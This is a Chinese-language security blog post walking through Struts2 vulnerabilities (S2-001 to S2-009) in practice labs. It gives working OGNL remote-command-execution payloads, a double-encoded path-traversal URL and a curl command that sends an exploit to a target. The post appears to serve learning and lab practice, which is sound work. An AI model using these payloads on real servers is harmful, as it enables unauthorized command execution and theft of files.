---
title: "Struts2全版本漏洞利用复现(长期更新)"
categories: [ "安全技术","工具分享" ]
tags: [ "struts2" ]
draft: false
slug: "532"
date: "2020-03-21 13:42:00"
---

## 事情起因

用靶场熟悉下`Struts2`的漏洞利用工具

注意：**单纯的使用工具不能加深对漏洞的理解，熟悉漏洞原理才是重点**

## 工具列举

`HatBoy`大佬的[`Struts2-Scan`][1]，以扫描某`S2-001`靶场为例：

![][2]

鬼哥`struts2(CVE-2013-2251)`漏洞检测工具(90sec.org)，同样以某`S2-001`靶场为例：

![][3]

`Lucifer1993`写的[`struts-scan`][4]，`windows`下运行乱码，以某`S2-004`靶场为例：

![][5]

`K8`团队的[`K8_Struts2_EXP`][6]，这里以某`S2-005`靶场为例：

![][7]

`K8`团队的工具解压密码为`k8gege`、`k8team`、`K8team`中的其中一个

天融信的工具，这里以某`S2-005`靶场为例：

![][8]

`lz520520`大佬的工具[`railgun`][9]，这里以某``靶场为例：

最常见到的`Srtuts2 漏洞检查工具2018版 V2.0 by 安恒应急响应中心 20180824`，这里以某``靶场为例：

## S2-001

漏洞原因：

> 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行

靶场正常样子：

![][10]

在 password 地方输入%{1+1}，点击登陆，发现报错返回解析成了 2，证明漏洞存在

获取 tomcat 执行路径：

```
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
```

![][11]

获取 Web 路径：

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
```

![][12]

执行命令：

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

```

![][13]

如果命令加参数：`new java.lang.String[]{"cat","/etc/passwd"}`

拿到`flag`

![][14]

## S2-004

目录遍历漏洞

漏洞介绍：

> Struts2 Dispatcher Logic by Design 允许为请求 URI 的 Web 应用程序类路径中的某些静态资源提供服务，请求 URI 的上下文相关路径以“/struts/”开头。filterDispatcher（在 2.0 中）和 defaultStaticContentLoader（在 2.1 中）存在安全漏洞，允许攻击者使用双编码 URL 和相对路径遍历目录结构并下载“static”内容文件夹之外的文件。
> 这说明存在文件遍历漏洞，相对路径遍历是../../../的方式，但需要双编码，所以需要将../两次 URL 编码为..%252f

靶场实操：

![][15]

根据提示，`key`在`showcase.jsp`这个页面中，通过目录遍历获得`key`：

```
URL/struts/..%252f..%252f..%252f..%252f..%252f..%252fshowcase.jsp
```

![][16]

## S2-005

远程代码执行漏洞，漏洞编号：CVE-2010-1870
影响版本: 2.0.0 - 2.1.8.1

原理(参考吴翰清的《白帽子讲 Web 安全》)

> s2-005 漏洞的起源源于 S2-003(受影响版本: 低于 Struts 2.0.12)，struts2 会将 http 的每个参数名解析为 OGNL 语句执行(可理解为 java 代码)。OGNL 表达式通过#来访问 struts 的对象，struts 框架通过过滤#字符防止安全问题，然而通过 unicode 编码(\u0023)或 8 进制(\43)即绕过了安全限制，对于 S2-003 漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用 OGNL 表达式将这 2 个选项打开，S2-003 的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上

`XWork`会将`GET`参数的键和值利用`OGNL`表达式解析成 Java 语句，如:`user.address.city=Bishkek&user['favoriteDrink']=kumys`会被转化成

```
action.getUser().getAddress().setCity("Bishkek")
action.getUser().setFavoriteDrink("kumys")
```

触发漏洞就是利用了这个点，再配合`OGNL`的沙盒绕过方法，组成了`S2-003`。官方对`003`的修复方法是增加了安全模式（沙盒），`S2-00`5 在`OGNL`表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：

```
S2-003 使用\u0023绕过s2对#的防御
S2-003 后官方增加了安全模式（沙盒）
S2-005 使用OGNL表达式将沙盒关闭，继续执行代码
```

靶场实操：

界面还做得挺好看：

![][17]

无回显`POC`:

```
action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
```

> 大概可以理解为，(aaa)(bbb)中 aaa 作为 OGNL 表达式字符串，bbb 作为该表达式的 root 对象，所以一般 aaa 位置如果需要执行代码，需要用引号包裹起来，而 bbb 位置可以直接放置 Java 语句。(aaa)(bbb)=true 实际上就是 aaa=true。不过确切怎么理解，还需要深入研究，有待优化

> POC 放到 tomcat8 下会返回 400，研究了一下发现字符\、"不能直接放 path 里，需要 urlencode，编码以后再发送就好了。这个 POC 没回显。

我尝试多次后还是没搞定，有机会遇到再搞，这里就用现成的工具了

`k8`的命令执行：

![][18]

## S2-007

漏洞类型：远程代码执行漏洞
漏洞原因：当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。**也就是一般出现在表单处**
影响版本: 2.0.0 - 2.2.3

靶场复现：

![][19]

在年龄中输入非数字类型点击登陆

![][20]

![][21]

年龄框的 value 变成 11，证明漏洞存在，执行任意代码的 EXP：

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ls ../').getInputStream())) + '
```

执行命令后查看不清楚可以`ctrl+U`查看网页源码，最终命令为`cat ../../../key.txt`得到`key`：

![][22]

## S2-008

漏洞类型：远程代码执行漏洞
影响版本：2.1.0 - 2.3.1
漏洞原理：

> S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。例如在 devMode 模式下直接添加参数?debug=command&expression=<OGNL EXP>，会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）：

```
action?debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22[命令]%22%29.getInputStream%28%29%2c%23b%3dnew java.io.InputStreamReader%28%23a%29%2c%23c%3dnew java.io.BufferedReader%28%23b%29%2c%23d%3dnew char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29
```

修改其中的命令便可得到结果文件，用记事本打开即可查看。

靶场复现：

直接`cat ../../../key.txt`查看(注意每次执行命令后都需要清空缓存，建议每执行一条命令换一个隐私窗口)：

![][23]

## S2-009

漏洞类型：远程代码执行漏洞
影响版本：2.1.0 - 2.3.1.1
漏洞原理：

> Struts2 对 s2-003 的修复方法是禁止#号，于是 s2-005 通过使用编码\u0023 或\43 来绕过；于是 Struts2 对 s2-005 的修复方法是禁止\等特殊符号，使用户不能提交反斜线。

> 但是，如果当前 action 中接受了某个参数 example，这个参数将进入 OGNL 的上下文。所以，我们可以将 OGNL 表达式放在 example 参数中，然后使用/helloword.acton?example=<OGNL statement>&(example)('xxx')=1 的方法来执行它，从而绕过官方对#、\等特殊字符的防御。

`poc`如下：

```
age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec("[命令]").getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
```

需要以`POST`方式提交

靶场复现：

![][24]

查找到存在漏洞的界面为第 5 个：`/ajax/example5.action`，用`HackBar`的`POST`方式执行`ls`：

![][25]

不能成功执行，那就换`burpsuite`：

![][26]

尝试也无果，最后使用`curl`命令行工具直接提交并保存结果到文件：

```
curl -X POST "http://xxx.xxx.xxx.xxx:yyyyy/ajax/example5.action" -d "age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]" --output a.txt
```

![][27]

把`ls`命令修改为`cat key.txt`即可得到`flag`：

![][28]

## 总结

暂无

参考文章：

- [vulhub 漏洞复现靶场][29]
- [Structs 全版本漏洞利用总结][30]
- [Struts2 著名 RCE 漏洞引发的十年之思][31]
- [从版本看核心，那些年我们做的 Struts2 安全机制研究][32]

本文完。（才怪）

[1]: https://github.com/HatBoy/Struts2-Scan
[2]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_135731.png
[3]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_135254.png
[4]: https://github.com/Lucifer1993/struts-scan
[5]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_142550.png
[6]: https://github.com/k8gege/K8tools/blob/master/K8_Struts2_EXP%20S2-045%20%26%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2020170310.rar
[7]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_151534.png
[8]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_171648.png
[9]: http://sec.lz520520.cn:88/article/7.html
[10]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_134126.png
[11]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_134417.png
[12]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_134606.png
[13]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_134710.png
[14]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_145451.png
[15]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_144112.png
[16]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_145248.png
[17]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_151159.png
[18]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_171511.png
[19]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_172415.png
[20]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_172605.png
[21]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_172625.png
[22]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200321_173038.png
[23]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200329_102028.png
[24]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200329_103249.png
[25]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200329_104530.png
[26]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200329_105449.png
[27]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200329_105634.png
[28]: https://img.soapffz.com/archives_img/2020/03/21/archives_20200329_110202.png
[29]: https://github.com/vulhub/vulhub/tree/master/struts2
[30]: https://mp.weixin.qq.com/s/a06y_BANpGFcgS9hJAAtGw
[31]: https://mp.weixin.qq.com/s/99pPDZFA1fo-tC8U1WD7qA
[32]: https://mp.weixin.qq.com/s/6Hx1Ngb9UMtJlRMWb6s2fQ